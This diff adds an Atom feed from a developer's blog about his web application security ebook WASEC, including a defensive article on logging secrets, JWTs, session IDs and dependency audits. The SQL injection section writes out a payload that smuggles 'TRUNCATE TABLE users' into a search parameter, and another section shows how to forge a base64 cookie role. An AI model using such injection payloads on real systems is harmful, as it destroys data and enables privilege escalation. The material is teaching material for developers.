@@ -1,0 +1,1900 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title><![CDATA[Category: Wasec | Alessandro Nadalin]]></title>
+  <link href="https://odino.org/categories/wasec/atom.xml" rel="self"/>
+  <link href="https://odino.org/"/>
+  <updated>2021-04-15T11:32:06+00:00</updated>
+  <id>https://odino.org/</id>
+  <author>
+    <name><![CDATA[Alessandro Nadalin]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[I've Decided to Make the WASEC Ebook Free During These Trying Times]]></title>
+    <link href="https://odino.org/ive-decided-to-make-the-wasec-ebook-free-during-these-trying-times/"/>
+    <updated>2020-03-20T08:10:00+00:00</updated>
+    <id>https://odino.org/ive-decided-to-make-the-wasec-ebook-free-during-these-trying-times</id>
+    <content type="html"><![CDATA[<p>Short post for the day to address an hopefully even shorter-lived situation
+we&rsquo;re all in.</p>
+
+<!-- more -->
+
+
+<p>I&rsquo;ve decided to make the WASEC book free, on LeanPub, for the time being.
+During these uncertain times, folks might find themselves home from their
+jobs or, even worse, having to deal with the loss of their livelihood.</p>
+
+<p>If you, like many others, are facing uncertain times and would want
+to spend time learning and educating yourself on the topic of web application
+security feel free to <a href="https://leanpub.com/wasec">have one on me</a>.</p>
+
+<h3>Update: 7th June 2020</h3>
+
+<p>The book is now back on sale for $9.99, as anticipated by my
+<a href="https://twitter.com/_odino_/status/1264926721050136583">tweet</a>.
+In line with my original announcement, I want to provide a path
+for those who cannot afford the book, so feel free to
+<a href="/wasec-a-book-about-web-application-security-is-now-available-for-sale/#what-if-i-can%E2%80%99t-afford-the-book">get in touch if unable to pay</a>.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[WASEC, a Book About Web Application Security, Is Now Available for Sale]]></title>
+    <link href="https://odino.org/wasec-a-book-about-web-application-security-is-now-available-for-sale/"/>
+    <updated>2019-11-25T22:41:00+00:00</updated>
+    <id>https://odino.org/wasec-a-book-about-web-application-security-is-now-available-for-sale</id>
+    <content type="html"><![CDATA[<p><img class="right" src="/images/wasec.jpeg"></p>
+
+<p>I&rsquo;m pleased to announce (even though you might have already heard about this on <a href="https://twitter.com/_odino_">my Twitter stream</a>)
+that the ebook on web application security I&rsquo;ve been working on over the past year is now
+officially available for sale, at the hopefully-reasonable price of <del>$6.99</del> $9.99.</p>
+
+<p>You can now buy the book at <a href="https://leanpub.com/wasec">leanpub.com/wasec</a>, while Kindle enthusiasts will
+have to wait a few more days for it to become available there: it is currently available for <a href="https://www.amazon.com/dp/B081Z7SD48">pre-order</a>
+and should be generally available in the next few days.</p>
+
+<p>WASEC is the culmination of over a year of thoughts regarding my experience with web application
+security from the point of view of a software engineer, rather than the one of a security researcher.
+I believe software engineers might find it extremely interesting as it approaches <em>defensive</em> security
+from the point of view of someone who has to build an app and needs to keep security into consideration
+<em>among other things</em>.</p>
+
+<!-- more -->
+
+
+<p>If you&rsquo;re unsure about purchasing the ebook you can take a look at some of its content that I previously
+shared <a href="/introduction-to-web-application-security/">in this blog</a>. If reading lengthy blog posts isn&rsquo;t
+your thing, you can also download the sample version from <a href="https://leanpub.com/wasec">leanpub itself</a> &mdash; it contains the first few
+complete chapters of the book.</p>
+
+<h2>What if I can&rsquo;t afford the book?</h2>
+
+<p>Reach out to me privately, and we&rsquo;ll sort something out. I will need to make sure you&rsquo;re not trying
+to <em>gamble the system</em>, but I&rsquo;d hate to see someone not being able to read the book simply because they
+can&rsquo;t afford it &mdash; I will try to make an effort to reply to everyone who reaches out to me, and make sure
+financial conditions don&rsquo;t get in the way of knowledge.</p>
+
+<p>I wrote this book to share what my experience with
+web security has been and, frankly, I don&rsquo;t think I&rsquo;ll ever make the money I spent on it (in terms of man-hours)
+ever &mdash; so there&rsquo;s no point in being greedy :&ndash;)</p>
+
+<p>Again, ping me and we&rsquo;ll try to work something out.</p>
+
+<h2>Sayonara</h2>
+
+<p>Again, please make sure you visit <a href="https://leanpub.com/wasec">WASEC&rsquo;s book page on leanpub</a> and,
+if you&rsquo;re interested in the topic and have a few bucks to spare, buy the book. Leanpub has a 45-day &ldquo;<a href="http://help.leanpub.com/en/articles/110743-what-if-i-want-to-return-a-book-can-i-get-a-refund">100% Happiness Guarantee</a>&rdquo;,
+which means there&rsquo;s no risk in purchasing any Leanpub book, and they make it easy to get a refund if you&rsquo;ve tried
+a book and want your money back within 45 days of your purchase. If you end up reading the book, feel free to reach
+out and let me know what your thoughts are.</p>
+
+<p>In the next few days I&rsquo;ll be publishing some more updates to the book (all future updates will be available for
+free for users who have purchased it) and release it on the Kindle store &mdash; hit me up if you have any question.</p>
+
+<p>Adios!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Web Application Security: What to Do When...]]></title>
+    <link href="https://odino.org/wasec-web-application-security-what-to-do-when-dot-dot-dot/"/>
+    <updated>2019-10-28T14:43:00+00:00</updated>
+    <id>https://odino.org/wasec-web-application-security-what-to-do-when-dot-dot-dot</id>
+    <content type="html"><![CDATA[<p><ol class="aseries">
+	<p>This post is part of the "<strong><a href="/categories/wasec/">WASEC: Web Application SECurity</a></strong>" series, which is a portion of the content of <a href="https://leanpub.com/wasec">WASEC</a>, an e-book on web application security I've written.</p>
+	<p>Here is a list of all the articles in this series:</p>
+	<li>
+		<a href="/web-security-demistified/">Web security demystified: WASEC</a>
+	</li>
+	<li>
+		<a href="/introduction-to-web-application-security/">Introduction</a>
+	</li>
+	<li>
+		<a href="/wasec-understanding-the-browser/">Understanding the browser</a>
+	</li>
+	<li>
+		<a href="/security-https-perspective/">Security at the HTTP level</a>
+	</li>
+	<li>
+		<a href="/secure-your-web-application-with-these-http-headers/">HTTP headers to secure your application</a>
+	</li>
+	<li>
+		<a href="/security-hardening-http-cookies/">Hardening HTTP cookies</a>
+	</li>
+	<li>
+		<a href="/wasec-web-application-security-what-to-do-when-dot-dot-dot/">Situationals</a>
+	</li>
+	</br>
+	<p>
+		If you've enjoyed the content of this article, consider buying the complete ebook on either the <a href="https://www.amazon.com/WASEC-Application-Everything-developer-application-ebook/dp/B081Z7SD48">Kindle store</a> or <a href="https://leanpub.com/wasec">Leanpub</a>.
+	</p>
+</ol>
+</p>
+
+<p>Often times, we&rsquo;re challenged with decisions that have a direct impact on the security of our applications, and the consequences of those decisions could potentially be disastrous. This article aims to present a few scenarios you might be faced with, and offer advice on how to handle each and every single of them.</p>
+
+<p>This is by no means an exhaustive list of security considerations you will have to make in your day to day as a software engineer, but rather an inspiration to keep security at the centre of your attention by offering a few examples.</p>
+
+<!-- more -->
+
+
+<h2>Blacklisting versus whitelisting</h2>
+
+<p>When implementing systems that require discarding elements based on an input (eg. rejecting requests based on an IP address or a comment based on certain words) you might be tempted to use a blacklist in order to filter elements out.</p>
+
+<p>The inherent problem with blacklist is the approach we&rsquo;re taking: it allows us to specify which elements we think are unsafe, making the strong assumption of knowing everything that might hurt us. From a security perspective, that&rsquo;s the equivalent of us wearing summer clothes because we&rsquo;re well into June, without looking out the window in order to make sure today&rsquo;s actually sunny: we make assumptions without having the whole picture, and it could hurt us.</p>
+
+<p>If you were, for example, thinking of filtering out comments based on a blacklist of words, you would probably start by describing a blacklist of 5 to 10 words: when coming up with the list you might be forgetting words such a <em>j3rk</em>, or reject genuine comments mentioning &ldquo;<a href="https://en.wikipedia.org/wiki/Dick_Bavetta">Dick Bavetta</a>&rdquo;, a retired NBA referee.</p>
+
+<p>Now, comments aren&rsquo;t always the most appropriate example in terms of security, but you get the gist of what we&rsquo;re talking about: it&rsquo;s hard to know everything that&rsquo;s going to hurt us well in advance, so whitelisting is generally a more cautious approach, allowing us to specify what input we trust.</p>
+
+<p>A more practical example would be logging: you will definitely want to whitelist what can be logged rather than the opposite. Take an example object such as:</p>
+
+<p>```js
+{</p>
+
+<pre><code>email: "lebron@james.com",
+password: "King_James",
+credit_card: "1111 2222 3333 4444",
+birthday: "1984-12-30",
+</code></pre>
+
+<p>}
+```</p>
+
+<p>You could possibly create a blacklist that includes <code>password</code> and <code>credit_card</code>, but what would happen when another engineer in the team changes fields from snake_case to camelCase?</p>
+
+<p>Our object would become:</p>
+
+<p>```js
+{</p>
+
+<pre><code>email: "lebron@james.com",
+password: "King_James",
+creditCard: "1111 2222 3333 4444",
+birthday: "1984-12-30",
+</code></pre>
+
+<p>}
+```</p>
+
+<p>You might end up forgetting to update your blacklist, leading to the credit card number of your customers being leaked all over your logs.</p>
+
+<p>As you&rsquo;ve probably realized, the choice of utilizing a blacklist or a whitelist highly depends on the context you&rsquo;re operating in: if you&rsquo;re exposing a service on the internet (such as facebook.com), then blacklisting is definitely not going to work, as that would mean knowing the IP address of every genuine visitor, which is practically impossible.</p>
+
+<p>From a security perspective, whitelisting is definitely a better approach, but is often impactical. Choose your strategy carefully after reviewing both options: none of the above is suitable without prior knowledge of your system, constraints and requirements.</p>
+
+<h2>Logging secrets</h2>
+
+<p>If you develop systems that have to deal with secrets such as passwords, credit card numbers, security tokens or personally identifiable information (abbr. PII), you need to be very careful about how you deal with these data within your application, as a simple mistake can lead to data leaks in your infrastructure.</p>
+
+<p>Take a look at this example, where our app fetches user details based on a header:</p>
+
+<p>```js
+app.get(&lsquo;/users/me&rsquo;, function(req, res){</p>
+
+<pre><code>try {
+    user = db.getUserByToken(req.headers.token)
+    res.send(user)
+} catch(err) {
+    log("Error in request: ", req)
+}
+</code></pre>
+
+<p>})
+```</p>
+
+<p>Now, this innocuous piece of code is actually dangerous: if an error occurs, the entire request gets logged.</p>
+
+<p>Having the whole request logged is going to be extremely helpful when debugging, but will also lead to storing auth tokens (available in the request&rsquo;s headers) in our logs: anyone who has access to those logs will be able to steal the tokens and impersonate your users.</p>
+
+<p>You might think that, since you have tight restrictions on who has access to your logs, you would still be &ldquo;safe&rdquo;: chances are that your logs are ingested into a cloud service such as <a href="https://cloud.google.com/stackdriver/">GCP&rsquo;s StackDriver</a> or <a href="https://aws.amazon.com/cloudwatch/features/">AWS' CloudWatch</a>, meaning that there are more attack vectors, such as the cloud provider&rsquo;s infrastructure itself, the communication between your systems and the provider to transmit logs and so on.</p>
+
+<p>The solution is to simply avoid logging sensitive information: whitelist what you log (as we&rsquo;ve seen in the previous paragraph) and be wary of logging nested entities (such as objects), as there might be sensitive information hiding somewhere inside them, such as our <code>req.headers.token</code>.</p>
+
+<p>Another solution would be to mask fields, for example turning a credit card number such as <code>1111 2222 3333 4444</code> into <code>**** **** **** 4444</code> before logging it.</p>
+
+<p>That&rsquo;s sometimes a dangerous approach: an erroneous deployment or a bug in your software might prevent your code from masking the right fields, leading to leaking the sensitive information. As I like to say: <strong>use it with caution</strong>.</p>
+
+<p>Last but not least, I want to mention one particular scenario in which any effort we make not to log sensitive information goes in vain: when users input sensitive information in the wrong place.</p>
+
+<p>You might have a login form with username and password, and users might actually input their password in the username field (this can generally happen when you &ldquo;autoremember&rdquo; their username, so that the input field is not available the next time they log in). Your logs would then look like this:</p>
+
+<p><code>text
+user e0u9f8f484hf94 attempted to login: failure
+user lebron@james.com attempted to login: success
+...
+</code></p>
+
+<p>Anyone with access to those logs can figure an interesting pattern out: if a username doesn&rsquo;t follow an email pattern (<em>email@domain.tld</em>), chances are the string is actually a password the user had wrongly typed in the username field. Then you would need to look at the successful login attempts been made shortly after, and try to login with the submitted password against a short list of usernames.</p>
+
+<p>What is the point here? Security is hard and, most often, things will work against you: in this context, being paranoid is a virtue.</p>
+
+<p><blockquote><p></p></p><p><h3>Who is silly enough to log a password?</h3></p><p><br/><p>You might think logging sensitive information is an amateur&rsquo;s mistake, but I argue that even experienced programmers and organizations fall fall under this trap. Facebook, in early 2019, suffered a <a href="https://newsroom.fb.com/news/2019/03/keeping-passwords-secure/">security incident</a> directly related to this problem. As <a href="https://krebsonsecurity.com/2019/03/facebook-stored-hundreds-of-millions-of-user-passwords-in-plain-text-for-years/">Brian Krebs</a> put it:</p></p><p><p>&ldquo;Facebook is probing a series of security failures in which employees built applications that logged unencrypted password data for Facebook users and stored it in plain text on internal company servers.&rdquo;</p></p><p><p>This is not to say that Facebook should not be held accountable for the incident, but rather that we can probably sympathize with the engineers who forgot the console.log somewhere in the code. Security is hard, and so making sure we pay extra-attention to what we log is an extremely important matter.</p></blockquote></p>
+
+<h2>Never trust the client</h2>
+
+<p>As we&rsquo;ve seen before, cookies that are issued by our servers can be tampered with, especially if they&rsquo;re not <code>HttpOnly</code> and are accesible by JS code on your page.</p>
+
+<p>At the same time, even if your cookies are <code>HttpOnly</code>, storing plaintext data in them is not secure, as any client (even <code>curl</code>), could get a hold of those cookie, modify them and re-issue a request with a modified version of the original cookie.</p>
+
+<p>Suppose your session cookie contains this information:</p>
+
+<p><code>text
+profile=dXNlcm5hbWU9TGVCcm9uLHJvbGU9dXNlcg==;
+</code></p>
+
+<p>The string is base64-encoded, and anyone could reverse it to get to its actual value, <code>username=LeBron,role=user</code>. Anyone could, at that point, replace <code>user</code> with <code>admin</code> and re-encode the string, altering the value of the cookie.</p>
+
+<p>If your system trusts this cookie without any additional check, you&rsquo;re in for trouble. You should instead <strong>never trust the client</strong>, and prevent it from being able to easily tamper with the data you&rsquo;ve handed off. A popular workaround to this issue is to encrypt or sign this data, like <a href="https://tools.ietf.org/html/rfc7519">JSON Web Tokens</a> do.</p>
+
+<p>Let&rsquo;s drift for a second and dive into JWT, as their simplicity lets us understand the security mechanism behind them extremely well. A JWT is made of 3 parts: headers, claims and signature, separated by a dot:</p>
+
+<p><code>text
+JWT = "$HEADER.$CLAIMS.$SIGNATURE"
+</code></p>
+
+<p>Each value is base64-encoded, with header and claims being nothing but an encoded JSON object:</p>
+
+<p>```text
+$HEADER = BASE64({
+  &ldquo;alg&rdquo;: &ldquo;HS256&rdquo;,  # HMAC SHA 256
+  &ldquo;typ&rdquo;: &ldquo;JWT&rdquo;     # type of the token
+})</p>
+
+<p>$CLAIMS = BASE64({
+  &ldquo;sub&rdquo;: &ldquo;1234567890&rdquo;, # ID of the user
+  &ldquo;name&rdquo;: &ldquo;John Doe&rdquo;,  # Other attributes&hellip;
+  &ldquo;iat&rdquo;: 1516239022    # issued at
+})</p>
+
+<p>JWT = &ldquo;$HEADER.$CLAIMS.$SIGNATURE&rdquo;
+```</p>
+
+<p>The last part, the signature, is the Message Authentication Code (abbr. MAC) of the combined <code>$HEADER.$CLAIM</code>, calculated through the algorithm specified in the header itself (<code>HMAC SHA-256</code> in our case). Once the MAC is calculated, it is base64-encoded as well:</p>
+
+<p>```text
+$HEADER = BASE64({
+  &ldquo;alg&rdquo;: &ldquo;HS256&rdquo;,
+  &ldquo;typ&rdquo;: &ldquo;JWT&rdquo;
+})</p>
+
+<p>$CLAIMS = BASE64({
+  &ldquo;sub&rdquo;: &ldquo;1234567890&rdquo;,
+  &ldquo;name&rdquo;: &ldquo;John Doe&rdquo;,
+  &ldquo;iat&rdquo;: 1516239022
+})</p>
+
+<p>$SIGNATURE = BASE64(HS256(&ldquo;$HEADER.$CLAIMS&rdquo;, $PRIVATE_KEY))</p>
+
+<p>JWT = &ldquo;$HEADER.$CLAIMS.$SIGNATURE&rdquo;
+```</p>
+
+<p>E-voila, our JWT is here!</p>
+
+<p>If you followed this far, you might have understood that JWT is simply composed of 3 parts: 2 insecure set of strings and a signed one, which is what is used to  verify the authenticy of the token. Without the signature, JWTs would be insecure and (arguably) useless, as the information they contain is simply base64-encoded.</p>
+
+<p>As a practical example, let&rsquo;s have a look at this token:</p>
+
+<p><code>text
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+</code></p>
+
+<p>As you can see, we have 3 base64-encoded strings, separated by dots. Reversing them in bash is straightforward:</p>
+
+<p><code>console
+$ cut -d'.' -f1 &lt;&lt;&lt; $TOKEN | base64 -d
+{"alg":"HS256","typ":"JWT"}
+$ cut -d'.' -f2 &lt;&lt;&lt; $TOKEN | base64 -d
+{"sub":"1234567890","name":"John Doe","iat":1516239022}
+</code></p>
+
+<p>As you would expect, the signature produces garbage instead:</p>
+
+<p><code>console
+$ cut -d'.' -f3 &lt;&lt;&lt; $TOKEN | base64 -d
+I�J�IHǊ(]�O���ǉ~N�%base64: invalid input
+</code></p>
+
+<p>That&rsquo;s the mechanism JWTs use to prevent clients from tampering with the tokens themselves: when a server validates a token, it will first verify its signature (through the public key associated by the private one used to generate the signature), then access the token&rsquo;s data. If you&rsquo;re planning to hand over critical information to the client, signing or encrypting it is the only way forward.</p>
+
+<p><blockquote><p></p></p><p><h3>Are JWTs safe?</h3></p><p><br/><p>JWTs have been under a lot of scrutiny in recent years, partly because of some design flaws that had to be course-corrected, such as the <a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/">support of a &lsquo;None&rsquo; algorithm</a> which would effectively allow forging tokens without any prior knowledge of secrets and keys used to sign them. Luciano Mammino, a researcher from Italy, even managed to publish a <a href="https://github.com/lmammino/jwt-cracker">JWT cracker</a> to illustrate how easy it could be to crack JWTs through brute-forcing, granted the algorithm and secrets used are weak.</p></p><p><p>In all honesty, JWTs are very useful when you want to exchange data between two parties. For example, you could send a client the URL <a href="https://example.com/check-this-message?token=$JWT">https://example.com/check-this-message?token=$JWT</a> so that they could access the data within the token and know it comes from a trusted source. As session IDs, often times there are simpler mechanism you should rely on, as you only really need to issue a cryptographically random ID that identifies a client.</p></p><p><p>Does this mean JWTs are not safe? Not really, as it depends on how you use them: Google, for example, allows <a href="https://developers.google.com/identity/protocols/OAuth2ServiceAccount#jwt-auth">authentication to their APIs through JWTs</a>, like many others; the trick is to use safe, long secrets or a cryptographically secure signing algorithm, and understand the use-case you&rsquo;re presented with. JWTs also don&rsquo;t make any effort to encrypt the data they hold, and they&rsquo;re only concerned with validating its authenticity: understand these trade-offs and make your own educated choice.</p></p><p><p>In addition, you might want to consider <a href="https://github.com/paragonie/paseto">PASETO</a>, &ldquo;Platform Agnostic SEcurity TOkens&rdquo;: they were designed with the explicit goal to provide the flexibility and feature-set of JWTs without some of the design flaws that have been highlighted earlier on.</p></p><p><p>Further readings:</p></p><p><ul><br/>    <li><a href="https://paragonie.com/blog/2017/03/jwt-json-web-tokens-is-bad-standard-that-everyone-should-avoid">paragonie.com/blog/2017/03/jwt-json-web-tokens-is-bad-standard-that-everyone-should-avoid</a></li><br/>    <li><a href="https://kevin.burke.dev/kevin/things-to-use-instead-of-jwt/">kevin.burke.dev/kevin/things-to-use-instead-of-jwt</a></li><br/>    <li><a href="https://www.pingidentity.com/en/company/blog/posts/2019/jwt-security-nobody-talks-about.html">www.pingidentity.com/en/company/blog/posts/2019/jwt-security-nobody-talks-about.html</a></li><br/></ul></p><p><br/><p></p></blockquote></p>
+
+<h2>Generating session IDs</h2>
+
+<p>It should go without saying, but your session IDs (often stored in cookies) should not resemble a know pattern, or be generally guessable. Using an auto-icrementing sequence of integers as IDs would be a terrible choice, as any attacker could just log in, receive session id <code>X</code> and then replace it with <code>X ± N</code>, where <code>N</code> is a small number to increase chances of that being an identifier of a recent, thus valid, session.</p>
+
+<p>The simplest choice would be to use a cryptographically secure function that generates a random string, and usually that&rsquo;s not a hard task to accomplish. Let&rsquo;s, for example, take the <a href="https://github.com/astaxie/beego">Beego</a> framework, very popular among Golang developers, as an example: the function that generates session IDs is</p>
+
+<p>```go
+package session</p>
+
+<p>import (</p>
+
+<pre><code>"crypto/rand"
+</code></pre>
+
+<p>)</p>
+
+<p>// &hellip;
+// &hellip;
+// &hellip;</p>
+
+<p>func (manager *Manager) sessionID() (string, error) {</p>
+
+<pre><code>b := make([]byte, manager.config.SessionIDLength)
+n, err := rand.Read(b)
+if n != len(b) || err != nil {
+    return "", fmt.Errorf("Could not successfully read from the system CSPRNG")
+}
+return manager.config.SessionIDPrefix + hex.EncodeToString(b), nil
+</code></pre>
+
+<p>}
+```</p>
+
+<p>6 lines of code, secure session IDs. As we mentioned earlier, no magic needs to be involved. In general, in most cases you won&rsquo;t need to write this code yourself, as frameworks would provide the basic building blocks to secure your application out of the box: if you&rsquo;re in doubt, though, you can review the framework&rsquo;s code, or open an issue on GitHub to clarify your security concern.</p>
+
+<h2>Querying your database while avoiding SQL injections</h2>
+
+<p>Right off the bat, you&rsquo;re probably thinking: &ldquo;<em>I&rsquo;ve heard about injections!</em>&rdquo;, and that&rsquo;s probably because was the #1 vulnerability in the &ldquo;<a href="https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf">2017 OWASP Top 10: The Ten Most Critical Web Application Security Risks</a>&rdquo;.</p>
+
+<p><img class="center" src="/images/wasec/owasp_2017_injection.png"></p>
+
+<p>But guess what, injections made the #1 spot in the 2010 and 2013 version of the same list as well, and so there&rsquo;s a strong chance you might be familiar with any type of injection risk. To quote what we discussed earlier in this chapter, the only thing you need to remember to fight injection is to <strong>never trust the client</strong>: if you receive data from a client, make sure it&rsquo;s validated, filtered and innocuous, then pass it to your database.</p>
+
+<p>A typical example of an injection vulnerability is the following SQL query:</p>
+
+<p><code>sql
+SELECT * FROM db.users WHERE name = "$name"
+</code></p>
+
+<p>Suppose <code>$name</code> comes from an external input, like the URL
+<code>https://example.com/users/search?name=LeBron</code>: an attacker can then craft a specific value for the variable that will significantly alter the SQL query being executed. For example, the URL <code>https://example.com/users/search?name=anyone%22%3B%20TRUNCATE%20TABLE%20users%3B%20--</code> would result in this query being executed:</p>
+
+<p><code>sql
+SELECT * FROM db.users WHERE name = "anyone"; TRUNCATE TABLE users; --"
+</code></p>
+
+<p>This query would return the right search result, but also destroy the users' table, with catastrophic consequences.</p>
+
+<p>Most frameworks and libraries provide you with the tools needed to sanitize data before feeding it to, for example, a database. The simplest solution, though, is to use prepared statements, a mechanism offered by most databases that prevents SQL injections altogether.</p>
+
+<p><blockquote><p></p></p><p><h3>Prepared statements: behind the scenes</h3></p><p><br/><p>Wondering how prepared statements work? They&rsquo;re very straightforward, but often misunderstood. The typical API of a prepared statement looks like:</p></p><p><p>query = <code>SELECT * FROM users WHERE id = ?</code><br/>db.execute(query, id)</p></p><p><p>As you can see, the &ldquo;base&rdquo; query itself is separated from the external variables that need to be embedded in the query: what most database drivers will eventually do is to first send the query to the database, so that it can prepare an execution plan for the query itself (that execution plan can also be reused for the same query using different parameters, so prepared statements have performance benefits as well). Separately, the driver will also send the parameters to be used in the query.</p></p><p><p>At that point the database will sanitize them, and execute the query together with the sanitized parameters.</p></p><p><p>There are 2 key takeaways in this process:</p></p><p><ul><br/>    <li>the query and parameters are never joined before being sent to the database, as it's the database itself that performs this operation</li><br/>    <li>you delegate sanitization to a built-in database mechanism, and that is likely to be more effective than any sanitization mechanism we could have come up by ourselves</li><br/></ul></p><p><br/><p></p></blockquote></p>
+
+<h2>Dependencies with known vulnerabilities</h2>
+
+<p>Chances are that the application you&rsquo;re working on <em>right now</em> depends on a plethora of open-source libraries: ExpressJS, a popular web framework for NodeJS, depends on 30 external libraries, and those libraries depend on&hellip;we could go on forever. As a simple exercise, I tried to install a brand new version of ExpressJS in my system, with interesting results:</p>
+
+<p><code>console
+$ npm install express
++ express@4.17.1
+added 50 packages from 37 contributors and audited 127 packages in 9.072s
+found 0 vulnerabilities
+</code></p>
+
+<p>Just by installing the latest version of ExpressJS, I&rsquo;ve included 50 libraries in my codebase. Is that inherently bad? Not at all, but it presents a security risk: the more code we write (or use), the larger the attack surface for malicious users.</p>
+
+<p>One of the biggest risks when using a plethora of external libraries is not following up on updates when they are released: it isn&rsquo;t so bad to use open-source libraries (after all, they probably are safer than most of the code we write ourselves), but forgetting to update them, especially when a security fix gets released, is a genuine problem we face every day.</p>
+
+<p>Luckily, programs such as npm provide tools to identify outdated packages with known vulnerabilities: we can simply try to install a dependency with a known vulnerability and run <code>npm audit fix</code>, and npm will do th job for us.</p>
+
+<p><code>``console
+$ npm install lodash@4.17.11
++ lodash@4.17.11
+added 1 package from 2 contributors and audited 288 packages in 1.793s
+found 1 high severity vulnerability
+  run</code>npm audit fix<code>to fix them, or</code>npm audit` for details
+$ npm audit</p>
+
+<pre><code>                   === npm audit security report ===                        
+</code></pre>
+
+<h1>Run  npm update lodash &mdash;depth 1  to resolve 1 vulnerability</h1>
+
+<p>┌───────────────┬──────────────────────────────────────────────────────────────┐
+│ High          │ Prototype Pollution                                          │
+├───────────────┼──────────────────────────────────────────────────────────────┤
+│ Package       │ lodash                                                       │
+├───────────────┼──────────────────────────────────────────────────────────────┤
+│ Dependency of │ lodash                                                       │
+├───────────────┼──────────────────────────────────────────────────────────────┤
+│ Path          │ lodash                                                       │
+├───────────────┼──────────────────────────────────────────────────────────────┤
+│ More info     │ <a href="https://npmjs.com/advisories/1065">https://npmjs.com/advisories/1065</a>                            │
+└───────────────┴──────────────────────────────────────────────────────────────┘</p>
+
+<p>found 1 high severity vulnerability in 1 scanned package
+  run <code>npm audit fix</code> to fix 1 of them.
+$ npm audit fix
++ <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#111;&#58;&#108;&#x6f;&#x64;&#x61;&#x73;&#104;&#64;&#52;&#46;&#x31;&#x37;&#46;&#x31;&#x35;">&#x6c;&#x6f;&#100;&#97;&#115;&#x68;&#x40;&#52;&#46;&#x31;&#x37;&#x2e;&#x31;&#x35;</a>
+updated 1 package in 0.421s
+fixed 1 of 1 vulnerability in 1 scanned package
+```</p>
+
+<p>If you&rsquo;re not using JavaScript and npm, you can always rely on external services to scan your software and let you know if any library with known vulnerabilities is found: GitHub offers this service for all their repositories, and you might find it convenient when your codebase is already hosted there.</p>
+
+<p><img class="center" src="/images/wasec/github_alerts.png"></p>
+
+<p>GitHub will also send you an email every time a dependency with a known vulnerability is detected, so you can head over to the repository and have a look at the problem in detail.</p>
+
+<p><img class="center" src="/images/wasec/github_alerts_detail.png"></p>
+
+<p>If you prefer using a different platform, you could try <a href="https://gitlab.com">gitlab.com</a>: it acquired Gemnasium, a product that offered vulnerability scanning, in early 2018 in order to compete with GitHub&rsquo;s offering. If you prefer to use a tool that does not require code hosting instead, <a href="https://snyk.io">snyk.io</a> would probably be your best bet: it&rsquo;s trusted by massive companies such as Google, Microsoft and SalesForce, and offers different tools for your applications, not just dependency scanning.</p>
+
+<h2>Have I been pwned?</h2>
+
+<p>Remember when you were a teenager, and signed up for your first online service ever? Do you remember the password you used? You probably don&rsquo;t, but the internet might.</p>
+
+<p>Chances are that, throughout your life, you&rsquo;ve used an online service that has been subject to attacks, with malicious users being able to obtain confidential information, such as your your password. I&rsquo;m going to make it personal here: my email address has been seen in at least 10 public security breaches, including incidents involving trustworthy companies such as LinkedIn and Dropbox.</p>
+
+<p>How do I know?</p>
+
+<p>I use a very interesting service called <a href="https://haveibeenpwned.com">haveibeenpwned.com</a> (abbr. HIBP), created by Troy Hunt, an Australian web security expert. The site collects information about public data breaches and allows you to understand whether your personal information was seen in any of these breaches. There&rsquo;s no shame in being involved in one of these data breaches, as it&rsquo;s not really your fault. This is, for example, the result of looking up the email address of Larry Page, one of Google&rsquo;s co-founders:</p>
+
+<p><img class="center" src="/images/wasec/larry_page.png"></p>
+
+<p><em>Larry&rsquo;s email address has been masked, but it&rsquo;s pretty public information</em></p>
+
+<p>By knowing when and where an incident happened, you can take a few actions to improve your personal security posture, such as activating two-factor authentication (abbr. 2FA) and being notified of a breach as soon as HIBP is.</p>
+
+<p>One of the interesting side-effects of HIBP is, though, the ability to use it to improve your business' security, as the site offers an API that you can use to verify whether users within your organization were involved in a data breach. This is extremely important as, too often, users consider security an afterthought, and opt out of mechanisms such as 2-factor authentication. This quickly becomes disastrous when you put in context of password re-use, a practice that is still way too common: a user signing up to multiple services using the same exact password. When one of those services is breached, the accounts on all the other ones might be breached as well.</p>
+
+<p><blockquote><p></p></p><p><h3>Re-using credentials: a real-world story</h3></p><p><br/><p>I&rsquo;ve been directly hit by a password re-use attack during my career, and it wasn&rsquo;t a fun experience.</p></p><p><p>While I was heading technology at an online company, our security team received a message from a (questionable) researcher claiming he could login into many of our user accounts, sending across plaintext passwords to prove the fact. Baffled, we quickly realized we either got compromised, or someone else had been: when the attacker revealed <em>how</em> he got those credentials, we quickly realized they were available to the public through some hardcore googling.</p></p><p><p>After obtaining a full list of emails included in the breach, we then had to join it with the list of our customers, ending with forcefully resetting the password of the ones found both in the breach and our own database.</p></blockquote></p>
+
+<h2>Session invalidation in a stateless architecture</h2>
+
+<p>If you&rsquo;ve ever built a web architecture, chances are that you&rsquo;ve heard how stateless ones scale better due to the fact that they do not have to keep track of state. That is true, and it represents a security risk, especially in the context of authentication state.</p>
+
+<p>In a typical stateful architecture, a client gets issued a session ID, which is stored on the server as well, usually linked to the user ID. When the client requests information from the server, it includes its session ID, so that the server knows that a particular request is made on behalf of a user with a particular ID, thanks to the mapping between session and user IDs. This requires the server store a list of all the session IDs it generated with a link to the user ID, and it can be a costly operation.</p>
+
+<p>JWTs, which we spoke about earlier on in this chapter, rose to prominence due to the fact that they easily allow stateless authentication between the client and the server, so that the server would not have to store additional information about the session. A JWT can include a user id, and the server can simply verify its signature on-the-fly, without having to store a mapping between a session ID and a user ID.</p>
+
+<p>The issue with stateless authentication tokens (and not just JWTs) lies in a simple security aspect: it is supposedly hard to invalidate tokens, as the server has no knowledge of each one it generated since they&rsquo;re not stored anywhere. If I logged in on a service yesterday, and my laptop gets stolen, an attacker could simply use my browser and would still be logged in on the stateless service, as there is no way for me to invalidate the previously-issued token.</p>
+
